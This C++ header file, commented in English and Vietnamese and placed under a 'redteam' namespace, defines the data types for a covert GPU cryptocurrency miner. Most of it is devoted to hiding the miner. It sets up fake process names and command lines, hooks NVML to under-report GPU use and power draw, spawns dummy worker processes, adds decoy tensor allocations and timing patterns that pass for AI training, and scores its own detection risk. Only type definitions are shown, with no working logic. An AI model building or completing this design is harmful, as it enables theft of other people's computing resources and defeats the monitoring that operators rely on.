#pragma once

#include <cstdint>
#include <string>
#include <vector>
#include <memory>
#include <atomic>

namespace redteam {

// ============================================================================
// Core Mining Types
// ============================================================================

/**
 * **GPU Device Info** (thông tin thiết bị GPU - đặc tả phần cứng)
 */
struct GpuDevice {
    int device_id;              // CUDA device index
    std::string name;           // GPU model name
    size_t total_memory;        // Total VRAM (bytes)
    size_t free_memory;         // Available VRAM
    int compute_capability;     // SM version (e.g., 86 for Ampere)
    int max_threads_per_block;
    int multiprocessor_count;
};

/**
 * **Mining Work** (công việc khai thác - đơn vị tác vụ từ pool)
 */
struct MiningWork {
    uint8_t header_hash[32];    // Block header hash
    uint64_t target;            // Difficulty target
    uint64_t nonce_start;       // Starting nonce
    uint64_t nonce_range;       // Nonce search space
    uint32_t job_id;            // Pool job identifier
    uint32_t epoch;             // DAG epoch number
};

/**
 * **Mining Result** (kết quả khai thác - share tìm được)
 */
struct MiningResult {
    uint64_t nonce;             // Found nonce
    uint8_t mix_hash[32];       // KawPow mix hash
    uint8_t result_hash[32];    // Final hash
    uint32_t job_id;            // Corresponding job
    bool valid;                 // Meets target difficulty
};

/**
 * **Hashrate Stats** (thống kê tốc độ băm - metrics hiệu suất)
 */
struct HashrateStats {
    double current_hashrate;    // H/s (current window)
    double average_hashrate;    // H/s (session average)
    uint64_t total_hashes;      // Total hashes computed
    uint32_t shares_found;      // Valid shares submitted
    uint32_t shares_accepted;   // Accepted by pool
    uint32_t shares_rejected;   // Rejected by pool
    double uptime_seconds;      // Mining session duration
};

// ============================================================================
// Evasion & Simulation Types
// ============================================================================

/**
 * **Workload Profile** (hồ sơ tải công việc - mô phỏng pattern)
 */
enum class WorkloadType {
    AI_TRAINING,        // TensorFlow/PyTorch-like pattern
    IMAGE_PROCESSING,   // OpenCV/PIL-like pattern
    SCIENTIFIC_COMPUTE, // NumPy/SciPy-like pattern
    AI_INFERENCE        // ONNX/TensorRT-like pattern
};

/**
 * **Evasion Config** (cấu hình trốn tránh - thiết lập ngụy trang)
 */
struct EvasionConfig {
    WorkloadType masquerade_type;   // Which workload to simulate
    std::string fake_process_name;  // Process name in ps/top
    std::string fake_cmdline;       // Fake /proc/self/cmdline

    // Metrics manipulation
    double gpu_util_report_factor;  // Multiply reported GPU util (0.6-0.9)
    double power_draw_noise;        // Power variation (Watts)
    bool enable_nvml_hooking;       // Hook NVML API calls

    // Process tree simulation
    int num_dummy_workers;          // Fake child processes (0-8)
    bool simulate_ipc;              // Fake inter-process communication

    // Memory pattern
    double real_mining_vram_ratio;  // % VRAM for actual mining (0.3-0.6)
    double fake_tensor_vram_ratio;  // % VRAM for dummy allocations
    int vram_rotation_interval_sec; // Rotate allocations every N seconds

    // Timing pattern
    int duty_cycle_percent;         // Mining duty cycle (70-95%)
    int burst_interval_sec;         // Burst duration for AI simulation
    int cooldown_interval_sec;      // Cooldown between bursts
};

/**
 * **Detection Surface** (bề mặt phát hiện - điểm có thể bị detect)
 */
struct DetectionSurface {
    bool kernel_signature_visible;      // PTX/SASS có mining pattern
    bool memory_pattern_visible;        // DAG allocation visible
    bool network_protocol_visible;      // Stratum protocol detectable
    bool process_tree_suspicious;       // Process tree không hợp lý
    bool power_profile_anomalous;       // Power draw pattern bất thường
    double detection_risk_score;        // Overall risk (0.0-1.0)
};

// ============================================================================
// Configuration Types
// ============================================================================

/**
 * **Mining Config** (cấu hình khai thác - thiết lập pool/wallet)
 */
struct MiningConfig {
    std::string pool_url;           // Stratum pool URL
    uint16_t pool_port;             // Pool port
    std::string wallet_address;     // RVN wallet address
    std::string worker_name;        // Worker identifier
    bool use_tls;                   // Enable TLS encryption

    // Performance tuning
    int intensity;                  // Mining intensity (1-30)
    int batch_size;                 // Hashes per kernel launch
    int threads_per_block;          // CUDA block size

    // Resource limits (for testing isolation)
    int max_power_watts;            // Power limit (0 = no limit)
    int max_temp_celsius;           // Temperature limit
    double max_gpu_util_percent;    // Max GPU utilization
};

/**
 * **System Config** (cấu hình hệ thống - thiết lập runtime)
 */
struct SystemConfig {
    MiningConfig mining;
    EvasionConfig evasion;

    // Multi-GPU setup
    std::vector<int> gpu_devices;   // CUDA device IDs to use
    bool enable_multi_gpu;          // Enable multi-GPU mining

    // Monitoring
    int metrics_report_interval_sec; // How often to report stats
    std::string log_file_path;      // Log file location
    bool enable_debug_logging;      // Verbose logging

    // Safety limits
    bool enable_thermal_protection; // Auto-throttle on overheat
    bool enable_crash_recovery;     // Auto-restart on failure
};

// ============================================================================
// Thread-Safe Shared State
// ============================================================================

/**
 * **Miner State** (trạng thái miner - runtime state machine)
 */
enum class MinerState {
    INITIALIZING,   // Starting up
    CONNECTING,     // Connecting to pool
    MINING,         // Actively mining
    PAUSED,         // Temporarily paused
    STOPPED,        // Gracefully stopped
    ERROR           // Error state
};

/**
 * **Shared Miner Context** (ngữ cảnh miner dùng chung - thread-safe state)
 */
struct SharedMinerContext {
    std::atomic<MinerState> state{MinerState::INITIALIZING};
    std::atomic<bool> shutdown_requested{false};
    std::atomic<uint64_t> total_hashes{0};
    std::atomic<uint32_t> shares_found{0};
    std::atomic<double> current_hashrate{0.0};

    // GPU metrics (reported values - may be obfuscated)
    std::atomic<double> reported_gpu_util{0.0};
    std::atomic<double> reported_power_draw{0.0};
    std::atomic<int> reported_temperature{0};
};

// ============================================================================
// Utility Aliases
// ============================================================================

using GpuDevicePtr = std::shared_ptr<GpuDevice>;
using MiningWorkPtr = std::shared_ptr<MiningWork>;
using MiningResultPtr = std::shared_ptr<MiningResult>;
using SharedContextPtr = std::shared_ptr<SharedMinerContext>;

} // namespace redteam
